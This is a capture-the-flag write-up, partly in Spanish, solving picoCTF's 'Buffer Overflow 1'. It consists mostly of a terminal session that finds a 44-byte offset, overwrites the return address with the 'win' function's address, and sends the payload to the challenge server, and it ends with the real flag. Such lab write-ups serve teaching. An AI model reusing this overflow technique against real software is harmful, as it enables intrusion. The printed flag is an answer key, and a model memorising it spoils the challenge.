## Objetivo
Control the return address.
## Solución
```
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow1]
└─$ wget https://artifacts.picoctf.net/c/187/vuln                                  
--2024-11-14 15:06:24--  https://artifacts.picoctf.net/c/187/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.161.55.26, 3.161.55.61, 3.161.55.64, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.161.55.26|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15704 (15K) [application/octet-stream]
Saving to: ‘vuln’

vuln                         100%[============================================>]  15.34K  --.-KB/s    in 0.003s  

2024-11-14 15:06:24 (4.68 MB/s) - ‘vuln’ saved [15704/15704]

                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow1]
└─$ chmod +x vuln  
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow1]
└─$ ./vuln  
Please enter your string: 
unaCadenaLargaaaaaaa
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                                                                       
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow1]
└─$ python3                       
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> exit()
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow1]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow1]
└─$ objdump -D vuln -M intel | grep "win"
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow1]
└─$ python3         
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic_find(0x6161616c)
44
>>> 'A'*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> exit()
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow1]
└─$ echo "picoCTF{banderota}" > flag.txt                                        
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{banderota}
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 51349
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b15b081e}
```

- ##### Después de encontrar la dirección de memoria de la función "win" y de introducir una cadena de 44 caracteres, obtenemos la bandera.
```
Flag: picoCTF{addr3ss3s_ar3_3asy_b15b081e}
```
## Notas Adicionales
## Referencias
- [PicoCTF](https://play.picoctf.org)
- [PicoCTF Writeups](https://www.youtube.com/playlist?list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&authuser=0)